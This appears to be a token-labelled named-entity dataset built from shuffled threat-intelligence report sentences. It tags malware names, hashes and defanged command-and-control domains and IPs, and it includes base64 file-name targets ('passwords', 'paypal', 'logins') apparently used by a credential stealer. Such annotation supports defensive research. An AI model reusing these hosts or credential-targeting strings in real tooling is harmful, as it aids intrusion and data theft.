had	O
been	O
signed	O
on	O
25	O
January	O
of	O
the	O
same	O
year	O
.	O

Then	O
it	O
expects	O
a	O
command	O
in	O
response	O
from	O
the	O
Command	O
&	O
Control	O
server	O
.	O

'	O
A	O
Rood	O
Awakening	O
!	O

a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c	B-hash
2016-10-06	O
11:03:54	O
Malicious	O
Word	O
document	O
with	O
Phishing	O
text	O
in	O
Vietnamese	O
blog(.)versign(.)info	B-url.cncsvr
(	O
23.227.196[.]210	B-ip.unknown
)	O
Images.verginnet(.)info	B-url.cncsvr
id.madsmans(.)com	B-url.cncsvr
(	O
176.107.176[.]6	B-ip.unknown
)	O
tonholding(.)com	B-url.cncsvr
nsquery(.)net	B-url.cncsvr
tonholding(.)com	B-url.cncsvr
nsquery(.)net	B-url.cncsvr
teriava(.)com	B-url.cncsvr
Thong	O
tin.doc	O
a5fbcbc17a1a0a4538fd987291f8dafd17878e33	B-hash
2016-10-25	O
Malicious	O
Word	O
document	O
with	O
Phishing	O
text	O
in	O
Vietnamese	O
WinWord.exe	O
ea67b24720da7b4adb5c7a8a9e8f208806fbc198	B-hash
Cobalt	O
Strike	O
payload	O
Downloads	O
hxxp://images.verginnet(.)info/2NX7M	B-url.cncsvr
Using	O
Cobalt	O
Strike	O
malleable	O
c2	O
oscp	O
profile	O
SndVolSSO.exe	O
1fef52800fa9b752b98d3cbb8fff0c44046526aa	B-hash
2016-08-01	O
09:03:58	O
Denis	B-malware.backdoor
Backdoor	O
Variant	O
Xwizard	O
/	O
KB12345678.exe	O
d48602c3c73e8e33162e87891fb36a35f621b09b	B-hash
2016-08-01	O
CiscoEapFast.exe	O
77dd35901c0192e040deb9cc7a981733168afa74	B-hash
2017-02-28	O
16:37:12	O
Denis	B-malware.backdoor
Backdoor	O
Variant	O

Information	O
harvesting	O
:	O
After	O
gaining	O
root	O
privileges	O
the	O
attackers	O
can	O
intercept	O
any	O
information	O
that	O
goes	O
in	O
or	O
out	O
of	O
the	O
infected	O
computer	O
.	O

To	O
learn	O
more	O
,	O
read	O
our	O
Security	O
101	O
:	O
Business	O
Process	O
Compromise	O
.	O

jduhf873jdu7.blog.163.com	B-url.unknown

A	O
memory	O
corruption	O
vulnerability	O
in	O
some	O
versions	O
of	O
Microsoft	O
Internet	O
Explorer	O
may	O
lead	O
to	O
remote	O
code	O
execution	O
or	O
an	O
application	O
crash	O
.	O

khanji[.]ddns[.]net	B-url.cncsvr
139[.]190[.]6[.]180	B-ip.unknown
39[.]40[.]141[.]25	B-ip.unknown
175[.]110[.]165[.]110	B-ip.unknown
39[.]40[.]44[.]245	B-ip.unknown
39[.]40[.]67[.]219	B-ip.unknown
119[.]160[.]68[.]178	B-ip.unknown
175[.]107[.]13[.]215	B-ip.unknown
39[.]47[.]125[.]110	B-ip.unknown
175[.]107[.]5[.]247	B-ip.unknown
175[.]107[.]6[.]174	B-ip.unknown
182[.]191[.]90[.]91	B-ip.unknown
175[.]107[.]7[.]50	B-ip.unknown
182[.]191[.]90[.]92	B-ip.unknown
175[.]107[.]7[.]69	B-ip.unknown
39[.]47[.]84[.]127	B-ip.unknown
192[.]169[.]136[.]121	B-ip.unknown
155[.]254[.]225[.]24	B-ip.unknown
203[.]31[.]216[.]214	B-ip.unknown
45[.]42[.]243[.]20	B-ip.unknown

Once	O
the	O
RAT	B-malware.drop
is	O
installed	O
on	O
the	O
host	O
it	O
will	O
be	O
used	O
to	O
administer	O
the	O
client	O
,	O
exfiltrate	O
data	O
,	O
or	O
leverage	O
the	O
client	O
as	O
a	O
pivot	O
to	O
attack	O
an	O
organization	O
's	O
internal	O
infrastructure	O
.	O

There	O
does	O
not	O
appear	O
to	O
be	O
any	O
reason	O
for	O
the	O
Professional	O
Commmons	O
website	O
to	O
have	O
a	O
hidden	O
iFrame	O
link	O
randomly	O
placed	O
in	O
the	O
middle	O
of	O
its	O
HTML	O
code	O
.	O

One	O
of	O
the	O
organizations	O
compromised	O
by	O
Chafer	O
in	O
2017	O
was	O
a	O
telecoms	O
services	O
provider	O
in	O
the	O
Middle	O
East	O
,	O
which	O
sells	O
its	O
solutions	O
to	O
multiple	O
telecoms	O
operators	O
in	O
the	O
region	O
.	O

More	O
specifically	O
,	O
this	O
threat	O
analysis	O
is	O
intended	O
for	O
security	O
operations	O
center	O
(	O
SOC	O
)	O
analysts	O
and	O
engineers	O
.	O

The	O
sample	O
in	O
question	O
was	O
not	O
an	O
actual	O
CozyDuke	B-malware.drop
main	O
component	O
,	O
but	O
a	O
CozyDuke	B-malware.drop
module	O
.	O

The	O
process	O
is	O
identified	O
by	O
the	O
control	O
server	O
sending	O
the	O
PID	O
to	O
the	O
malware	O
.	O

This	O
conclusion	O
is	O
supported	O
by	O
the	O
following	O
assessments	O
:	O
The	O
campaigns	O
target	O
different	O
industries	O
in	O
different	O
geographic	O
locations	O
.	O

2017	O
was	O
not	O
any	O
different	O
in	O
this	O
regard	O
.	O

The	O
threat	O
actor	O
targeted	O
the	O
company	O
's	O
top-level	O
management	O
by	O
using	O
sophisticated	O
spear-phishing	O
attacks	O
as	O
the	O
initial	O
penetration	O
vector	O
,	O
ultimately	O
compromising	O
the	O
computers	O
of	O
vice	O
presidents	O
,	O
senior	O
directors	O
and	O
other	O
key	O
personnel	O
in	O
the	O
operational	O
departments	O
.	O

The	O
attack	O
has	O
also	O
been	O
observed	O
against	O
the	O
financial	O
sector	O
in	O
Saudi	O
Arabia	O
and	O
Russia	O
.	O

It	O
is	O
not	O
clear	O
whether	O
the	O
compilation	O
timestamps	O
are	O
falsified	O
,	O
but	O
an	O
earlier	O
compilation	O
time	O
than	O
the	O
actual	O
stamp	O
seems	O
unlikely	O
.	O

However	O
,	O
we	O
observed	O
only	O
six	O
of	O
these	O
servers	O
active	O
at	O
any	O
given	O
time	O
,	O
suggesting	O
that	O
some	O
IP	O
addresses	O
may	O
have	O
changed	O
during	O
our	O
scans	O
.	O

110.173.188.53:443	B-ip.unknown
70.60.36.183:443	B-ip.unknown
72.10.122.70:443	B-ip.unknown
112.160.75.159:5443	B-ip.unknown
125.142.192.81:443	B-ip.unknown
175.213.42.234:443	B-ip.unknown
Yara	O
Rules	O

INV#94586.jar	B-malware.infosteal

Below	O
are	O
examples	O
of	O
a	O
document	O
and	O
a	O
malicious	O
email	O
,	O
targeting	O
Arabic	O
speaking	O
victims	O
.	O

Valid	O
:	O
1:00	O
AM	O
8/5/2011	O
to	O
12:59	O
AM	O
8/5/2012	O

Download	O
and	O
execute	O
more	O
malicious	O
executables	O
.	O

SHA1	O
hash	O
:	O
394703d1240ccd3aaeeef50c212313e3036741b1	B-hash

The	O
malware	O
also	O
uses	O
the	O
legitimate	O
cURL	O
library	O
in	O
the	O
form	O
of	O
libcurld.dll	O
.	O

이	O
위협	O
그룹은	O
2014년과	O
2015년에	O
걸쳐	O
발생한	O
사이버	O
공격	O
'	O
오퍼레이션	O
블랙	O
마인	O
(	O
Operation	B-malware.backdoor
Black	I-malware.backdoor
Mine	I-malware.backdoor
)	O
'	O
과도	O
연관성이	O
있다	O
.	O

generateHttpMes	O
:	O
data_size	O
:	O
size_http_mes	O
:	O
]	O

TrendLabs	O
Security	O
Intelligence	O
Blog	O
,	O
Trend	O
Micro	O
.	O

Next	O
,	O
the	O
RAT	B-malware.backdoor
calls	O
a	O
function	O
that	O
uses	O
the	O
decrypted	O
confi	O
guration	O
data	O
to	O
populate	O
the	O
following	O
fi	O
elds	O
:	O
lpszHost	O
,	O
dwPort	O
,	O
lpszProxyHost	O
,	O
dwProxyPort	O
,	O
lpszProxyUser	O
,	O
lpszProxyPass	O
.	O

The	O
malware	O
overwrites	O
the	O
master	O
boot	O
record	O
(	O
MBR	O
)	O
and	O
the	O
rest	O
of	O
the	O
harddisk	O
with	O
the	O
strings	O
'	O
PRINCIPES	O
'	O
or	O
'	O
HASTATI	O
.	O
'	O
.	O

The	O
attacker	O
could	O
have	O
caused	O
a	O
process	O
shutdown	O
by	O
issuing	O
a	O
halt	O
command	O
or	O
intentionally	O
uploading	O
flawed	O
code	O
to	O
the	O
SIS	O
controller	O
to	O
cause	O
it	O
to	O
fail	O
.	O

Research	O
into	O
this	O
HIGHTIDE	B-malware.backdoor
campaign	O
revealed	O
APT12	O
targeted	O
multiple	O
Taiwanese	O
Government	O
organizations	O
between	O
August	O
22	O
and	O
28	O
.	O

'	O
!	O
cp	O
cf	O
e	O
:	O
%	O
d	O
'	O
'	O
!	O
c	O
r\n	O
'	O
'	O
!	O
c	O
tr\n	O
'	O
'	O
!	O
c	O
.inf	O
,	O
e	O
:	O
%	O
d	O
'	O
'	O
'	O
!	O
C	O
c\n	O
'	O
'	O
!	O
c	O
.inf	O
'	O
'	O
!	O
c	O
ser	O
'	O

To	O
determine	O
how	O
long	O
the	O
server	O
has	O
been	O
connected	O
to	O
the	O
client	O
,	O
the	O
return	O
value	O
of	O
the	O
function	O
GetTickCount	O
(	O
)	O
gets	O
saved	O
.	O

Threat	O
Connect	O
.	O

Launcher	O
:	O
This	O
module	O
itself	O
.	O

All	O
other	O
product	O
or	O
company	O
names	O
may	O
be	O
trademarks	O
or	O
registered	O
trademarks	O
of	O
their	O
owners	O
.	O

Sofacy	O
,	O
one	O
of	O
the	O
most	O
active	O
APT	O
we	O
monitor	O
,	O
continues	O
to	O
spearphish	O
their	O
way	O
into	O
targets	O
,	O
reportedly	O
widely	O
phishes	O
for	O
credentials	O
,	O
and	O
infrequently	O
participates	O
in	O
server	O
side	O
activity	O
(	O
including	O
host	O
compromise	O
with	O
BeEF	B-malware.backdoor
deployment	I-malware.backdoor
,	O
for	O
example	O
)	O
.	O

Dino	B-malware.backdoor
's	O
configuration	O
is	O
initially	O
stored	O
in	O
a	O
serialized	O
DataStore	O
object	O
contained	O
in	O
a	O
zip	O
archive	O
at	O
the	O
end	O
of	O
the	O
Dino	B-malware.backdoor
binary	O
.	O

There	O
were	O
several	O
leftover	O
comments	O
in	O
the	O
plugin	O
in	O
Chinese	O
.	O

dG9yLmRvYw==	O
cGFzc3dvcmRz	O
cGF5cGFs	O
bG9naW5zLg==	O
bG9naW5z	O
aWQucGRm	O
aWQuanBn	O

The	O
SPUSER14	O

The	O
commands	O
'	O
cronadd	O
'	O
,	O
'	O
cronlist	O
'	O
and	O
'	O
crondel	O
'	O
serve	O
respectively	O
to	O
add	O
,	O
list	O
,	O
and	O
remove	O
scheduled	O
tasks	O
registered	O
in	O
the	O
CRONTAB	O
module	O
.	O

In	O
this	O
blog	O
post	O
I	O
describe	O
a	O
new	O
attack	O
campaign	O
where	O
cyber	O
espionage	O
group	O
targeted	O
the	O
users	O
of.Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
is	O
a	O
Public	O
Sector	O
Undertaking	O
of	O
Government	O
of	O
India	O
(	O
Ministry	O
of	O
Defence	O
)	O
and	O
it	O
specializes	O
in	O
manufacturing	O
warships	O
and	O
submarines	O
for	O
the	O
Indian	O
Navy	O
.	O

Scope	O
Note	O
:	O
Insikt	O
Group	O
conducted	O
interviews	O
with	O
a	O
former	O
Iranian	O
hacker	O
with	O
first-hand	O
knowledge	O
of	O
the	O
information	O
shared	O
and	O
was	O
living	O
in	O
Iran	O
when	O
he	O
started	O
one	O
of	O
Iran	O
's	O
first	O
security	O
forums	O
.	O

Hence	O
,	O
the	O
malware	O
also	O
intercepts	O
the	O
confirmation	O
SWIFT	O
messages	O
and	O
then	O
sends	O
for	O
printing	O
the	O
'	O
doctored	O
'	O
(	O
manipulated	O
)	O
copies	O
of	O
such	O
messages	O
in	O
order	O
to	O
cover	O
up	O
the	O
fraudulent	O
transactions	O
.	O

Figure	O
6	O
:	O

During	O
the	O
past	O
year	O
and	O
a	O
half	O
,	O
the	O
Iron	O
group	O
has	O
developed	O
multiple	O
types	O
of	O
malware	O
(	O
backdoors	O
,	O
crypto-miners	O
,	O
and	O
ransomware	O
)	O
for	O
Windows	O
,	O
Linux	O
and	O
Android	O
platforms	O
.	O

[	O
그림	O
14	O
]	O
원본	O
파일과	O
생성	O
파일	O
비교	O
[	O
표	O
2	O
]	O
는	O
Rifdoor와	B-malware.backdoor
관련된	O
주요	O
명령	O
및	O
해당	O
기능이다	O
.	O

This	O
suggests	O
that	O
attackers	O
had	O
prior	O
knowledge	O
of	O
the	O
recipient	O
email	O
id	O
through	O
other	O
means	O
.	O

Cobalt	O
Strike1.45	O
and	O
It	O
can	O
connect	O
the	O
metasploit	O
of	O
Windows	O
.	O

In	O
order	O
to	O
hide	O
the	O
fraudulent	O
transactions	O
carried	O
out	O
by	O
the	O
attacker	O
(	O
s	O
)	O
,	O
the	O
database/message	O
manipulations	O
are	O
not	O
sufficient	O
.	O

The	O
business	O
cycle	O
includes	O
what	O
is	O
euphemistically	O
referred	O
to	O
as	O
'	O
financial	O
forecasting	O
'	O
using	O
stolen	O
information	O
,	O
so	O
we	O
like	O
to	O
say	O
that	O
Poseidon	B-malware.infosteal
's	O
boutique	O
not	O
only	O
deals	O
in	O
targeted	O
attacks	O
but	O
also	O
stolen	O
treasures	O
.	O

At	O
first	O
glance	O
,	O
this	O
looks	O
like	O
an	O
(	O
almost	O
)	O
valid	O
,	O
although	O
minimalist	O
,	O
HTTP	O
request	O
that	O
is	O
terminated	O
with	O
a	O
double	O
carriage-return/line-feed	O
(	O
CRLF	O
)	O
combination	O
.	O